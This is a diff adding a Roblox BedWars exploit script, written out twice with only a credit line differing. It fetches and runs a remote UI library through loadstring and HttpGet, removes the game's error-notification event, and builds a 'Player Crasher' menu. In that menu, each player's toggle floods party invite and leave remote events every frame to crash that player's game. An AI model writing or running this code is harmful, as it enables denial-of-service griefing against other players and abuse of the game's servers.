@@ -1,0 +1,130 @@
+local lplr = game.Players.LocalPlayer
+local repstorage = game:GetService("ReplicatedStorage")
+local Client = require(repstorage.TS.remotes).default.Client
+local connectionstodisconnect = {}
+bedwars = {
+    ["ClientStoreHandler"] = require(lplr.PlayerScripts.TS.ui.store).ClientStore,
+    ["ClientHandler"] = Client,
+}
+            game:GetService("ReplicatedStorage")["events-@easy-games/game-core:shared/game-core-networking@getEvents.Events"].sendErrorNotification:Destroy()
+
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+local Window = OrionLib:MakeWindow({Name = "Player Crasher", HidePremium = false, SaveConfig = true, ConfigFolder = "Playercrashtest"})
+
+local Tab = Window:MakeTab({
+    Name = "Player Crasher",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local Tab2 = Window:MakeTab({
+    Name = "Credits",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+    Name = "Crasher"
+})
+
+local Section2 = Tab:AddSection({
+    Name = "Azura Private"
+})
+
+local Section2 = Tab2:AddSection({
+    Name = "Azura Private"
+})
+
+local RunService = game:GetService("RunService")
+
+task.spawn(function()
+    for i,v in pairs(game.Players:GetChildren()) do
+Tab:AddToggle({
+    Name = "Crash " .. v.Name .." (@" .. v.DisplayName .. ")" ,
+    Default = false,
+    Callback = function(Callback)
+        if Callback then
+        local RStepped;
+        RStepped = RunService.RenderStepped:Connect(function()
+            game:GetService("ReplicatedStorage")["events-@easy-games/lobby:shared/event/lobby-events@getEvents.Events"].leaveParty:FireServer()
+
+            local ohTable1 = {
+                ["player"] = game:GetService("Players")[v.Name]
+            }
+game:GetService("ReplicatedStorage")["events-@easy-games/lobby:shared/event/lobby-events@getEvents.Events"].inviteToParty:FireServer(ohTable1)
+
+connectionstodisconnect[#connectionstodisconnect + 1] = bedwars["ClientHandler"]:OnEvent("MatchEndEvent", function(p2)
+    RStepped:Disconnect()
+end)
+end)
+end
+end
+})
+end
+end)
+local lplr = game.Players.LocalPlayer
+local repstorage = game:GetService("ReplicatedStorage")
+local Client = require(repstorage.TS.remotes).default.Client
+local connectionstodisconnect = {}
+bedwars = {
+    ["ClientStoreHandler"] = require(lplr.PlayerScripts.TS.ui.store).ClientStore,
+    ["ClientHandler"] = Client,
+}
+            game:GetService("ReplicatedStorage")["events-@easy-games/game-core:shared/game-core-networking@getEvents.Events"].sendErrorNotification:Destroy()
+
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+local Window = OrionLib:MakeWindow({Name = "Player Crasher made/coded by bacon#4178", HidePremium = false, SaveConfig = true, ConfigFolder = "Playercrashtest"})
+
+local Tab = Window:MakeTab({
+    Name = "Player Crasher",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local Tab2 = Window:MakeTab({
+    Name = "Credits",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+local Section = Tab:AddSection({
+    Name = "Crasher"
+})
+
+local Section2 = Tab:AddSection({
+    Name = "Azura Private"
+})
+
+local Section2 = Tab2:AddSection({
+    Name = "Azura Private"
+})
+
+local RunService = game:GetService("RunService")
+
+task.spawn(function()
+    for i,v in pairs(game.Players:GetChildren()) do
+Tab:AddToggle({
+    Name = "Crash " .. v.Name .." (@" .. v.DisplayName .. ")" ,
+    Default = false,
+    Callback = function(Callback)
+        if Callback then
+        local RStepped;
+        RStepped = RunService.RenderStepped:Connect(function()
+            game:GetService("ReplicatedStorage")["events-@easy-games/lobby:shared/event/lobby-events@getEvents.Events"].leaveParty:FireServer()
+
+            local ohTable1 = {
+                ["player"] = game:GetService("Players")[v.Name]
+            }
+game:GetService("ReplicatedStorage")["events-@easy-games/lobby:shared/event/lobby-events@getEvents.Events"].inviteToParty:FireServer(ohTable1)
+
+connectionstodisconnect[#connectionstodisconnect + 1] = bedwars["ClientHandler"]:OnEvent("MatchEndEvent", function(p2)
+    RStepped:Disconnect()
+end)
+end)
+end
+end
+})
+end
+end)
